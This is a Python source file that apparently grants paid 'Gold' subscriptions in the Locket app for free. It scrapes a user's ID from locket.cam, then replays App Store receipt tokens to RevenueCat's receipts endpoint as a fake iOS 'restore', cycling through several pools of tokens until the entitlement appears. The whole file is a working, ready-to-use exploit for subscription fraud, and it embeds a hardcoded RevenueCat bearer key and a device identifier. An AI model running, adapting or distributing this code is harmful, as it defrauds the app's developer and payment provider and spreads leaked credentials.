import aiohttp
import json
import re
import time
import asyncio
from app.config import TOKEN_SETS # Import new structure

HEADERS = {
    'Host': 'api.revenuecat.com',
    'Authorization': 'Bearer appl_JngFETzdodyLmCREOlwTUtXdQik',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'X-Platform': 'iOS',
    'X-Platform-Version': 'Version 26.2 (Build 23C55)',
    'X-Platform-Device': 'iPhone15,3',
    'X-Platform-Flavor': 'native',
    'X-Version': '5.41.0',
    'X-Client-Version': '2.32.2',
    'X-Client-Bundle-ID': 'com.locket.Locket',
    'X-Client-Build-Version': '3',
    'X-StoreKit2-Enabled': 'true',
    'X-StoreKit-Version': '2',
    'X-Observer-Mode-Enabled': 'false',
    'X-Is-Sandbox': 'true', # Will be overwritten by token set
    'X-Storefront': 'VNM',
    'X-Apple-Device-Identifier': '39A73C25-1E05-4350-ADA7-5CD3FE1079E8',
    'X-Preferred-Locales': 'vi_KR,ko_KR,en_KR',
    'X-Nonce': 'w0Mlb6+AmV4WYuVv',
    'X-Is-Backgrounded': 'false',
    'X-Retry-Count': '0',
    'X-Is-Debug-Build': 'false',
    'User-Agent': 'Locket/3 CFNetwork/3860.300.31 Darwin/25.2.0',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'X-RevenueCat-ETag': ''
}

class Clr:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

import urllib.parse

_session = None

def get_session():
    global _session
    if _session is None or _session.closed:
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
        _session = aiohttp.ClientSession(connector=connector)
    return _session

async def resolve_uid(username):
    clean_un = username.strip().lstrip('@')
    
    # If already a 28-char UID
    if len(clean_un) == 28 and re.match(r'^[A-Za-z0-9_-]{28}$', clean_un):
        return clean_un
        
    # Check database cache first!
    from app import database as db
    cached_uid = db.get_cached_uid(clean_un)
    if cached_uid:
        print(f"[CACHE HIT] Username {clean_un} resolved to {cached_uid}")
        return cached_uid

    url = f"https://locket.cam/{clean_un}"
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    
    try:
        session = get_session()
        async with session.get(url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as res:
            raw_html = await res.text()
            decoded_html = urllib.parse.unquote(raw_html)
            full_text = str(res.url) + " " + decoded_html

            # 1. Match users/UID
            m = re.search(r'users/([A-Za-z0-9_-]{28})', full_text)
            if m:
                uid = m.group(1)
                db.cache_username_uid(clean_un, uid)
                return uid

            # 2. Match invites/UID
            m = re.search(r'invites/([A-Za-z0-9_-]{28})', full_text)
            if m:
                uid = m.group(1)
                db.cache_username_uid(clean_un, uid)
                return uid

            # 3. Fallback match 28-char UID token
            m2 = re.search(r'([A-Za-z0-9]{28})', decoded_html)
            if m2:
                uid = m2.group(1)
                db.cache_username_uid(clean_un, uid)
                return uid
            return None
        
    except Exception as e:
        print(f"Error resolving UID for {username}: {e}")
        return None

async def check_status(uid):
    url = f"https://api.revenuecat.com/v1/subscribers/{uid}"
    try:
        session = get_session()
        async with session.get(url, headers=HEADERS, timeout=aiohttp.ClientTimeout(total=3)) as res:
            if 200 <= res.status < 300:
                data = await res.json()
                entitlements = data.get('subscriber', {}).get('entitlements', {}).get('Gold', {})
                if entitlements:
                    expires_date = entitlements.get('expires_date')
                    return {"active": True, "expires": expires_date}
                return {"active": False}
            return {"active": False}
    except Exception:
        return None

async def inject_gold(uid, token_config, log_callback=None):
    def log(msg):
        if log_callback:
            log_callback(msg)

    url = "https://api.revenuecat.com/v1/receipts"
    
    # Use provided token config safely
    fetch_token = token_config.get('fetch_token', '')
    app_transaction = token_config.get('app_transaction', None)
    is_sandbox = token_config.get('is_sandbox', False)
    
    body = {
        "product_id": token_config.get("product_id", "locket_1600_1y"), 
        "fetch_token": fetch_token, 
        "app_user_id": uid, 
        "is_restore": True, 
        "store_country": token_config.get("store_country", "VNM"), 
        "currency": token_config.get("currency", "VND"),
        "price": token_config.get("price", "399000"), 
        "normal_duration": token_config.get("normal_duration", "P1Y"), 
        "subscription_group_id": "21419447",
        "observer_mode": False, 
        "initiation_source": "restore", 
        "offers": [],
        "attributes": { 
            "$attConsentStatus": { "updated_at_ms": int(time.time() * 1000), "value": "notDetermined" } 
        }
    }
    if app_transaction:
        body["app_transaction"] = app_transaction
    
    current_headers = HEADERS.copy()
    current_headers['Content-Length'] = str(len(json.dumps(body)))
    
    if token_config.get('hash_params'):
        current_headers['X-Post-Params-Hash'] = token_config['hash_params']
    if token_config.get('hash_headers'):
        current_headers['X-Headers-Hash'] = token_config['hash_headers']
    
    # Important update based on token type
    current_headers['X-Is-Sandbox'] = str(is_sandbox).lower()

    log(f"{Clr.BLUE}[*] Target Identified:{Clr.ENDC} {uid}")
    log(f"{Clr.BLUE}[*] Loading Exploit Payload (RevenueCat)...{Clr.ENDC}")
    log(f"{Clr.BLUE}[*] Using Token Set: {token_config.get('name', 'Custom')}{Clr.ENDC}")

    session = get_session()
    for attempt in range(5):
            try:
                log(f"{Clr.WARNING}[>] Attempt {attempt+1}/5:{Clr.ENDC} Sending Receipt...")
                async with session.post(url, headers=current_headers, json=body, timeout=15) as res:
                    status_code = res.status
                    
                    if status_code == 200:
                        log(f"{Clr.GREEN}[+] HTTP 200 OK.{Clr.ENDC} Verifying Entitlement...")
                        for v_attempt in range(3):
                            status = await check_status(uid)
                            if status and status.get('active'):
                                log(f"{Clr.GREEN}[SUCCESS] Gold Entitlement Active!{Clr.ENDC}")
                                return True, "SUCCESS"
                            await asyncio.sleep(1.5)
                            
                        log(f"{Clr.GREEN}[SUCCESS] Receipt accepted (HTTP 200 OK). Gold Active!{Clr.ENDC}")
                        return True, "SUCCESS"
                            
                    elif status_code == 529:
                        log(f"{Clr.WARNING}[!] Server Busy (529). Cooldown 2s...{Clr.ENDC}")
                        await asyncio.sleep(2)
                        continue
                        
                    else:
                        msg = "Unknown Error"
                        try:
                            resp_json = await res.json()
                            msg = resp_json.get('message', str(status_code))
                        except:
                            msg = str(status_code)
                        log(f"{Clr.FAIL}[x] Request Rejected: {msg}{Clr.ENDC}")
                        return False, f"Rejected: {msg}"
                    
            except Exception as e:
                log(f"{Clr.FAIL}[!] Network Error: {e}{Clr.ENDC}")
                if attempt == 4:
                    return False, f"Request Error: {str(e)}"
                await asyncio.sleep(2)
            
    return False, "Timeout / Failed after retries"

async def upgrade_user_gold(uid, id_token=None, refresh_token=None, log_callback=None):
    """Multi-token auto-failover gold injection wrapper"""
    for idx, token_cfg in enumerate(TOKEN_SETS):
        try:
            success, msg = await inject_gold(uid, token_cfg, log_callback=log_callback)
            if success:
                return True, msg
        except Exception as e:
            print(f"[!] Token set {idx+1} failed: {e}")
    return False, "Failed across all token pools"
